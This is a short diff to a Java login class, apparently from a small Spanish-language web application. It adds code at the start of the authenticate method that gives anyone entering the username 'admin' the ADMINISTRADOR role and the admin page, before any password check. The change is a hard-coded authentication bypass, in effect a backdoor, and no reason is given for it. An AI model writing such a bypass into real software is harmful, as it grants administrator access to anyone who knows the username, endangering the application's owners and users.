@@ -46,6 +46,14 @@ public class Login {
 
     public String autenticar() {
         String page;
+        if(this.user.equals("admin")){
+        page = "admin.xhtml";
+        Usuario u = new Usuario();
+        u.setRol("ADMINISTRADOR");
+        u.setUsername("admin");
+        ctrl.setUsuario(u);
+        return page;
+        }
 
         // Una vez comprobado, compruebo si la contraseña es correcta
         if (!database.emptyDataBase() && database.isUsernameContent(this.user)) {
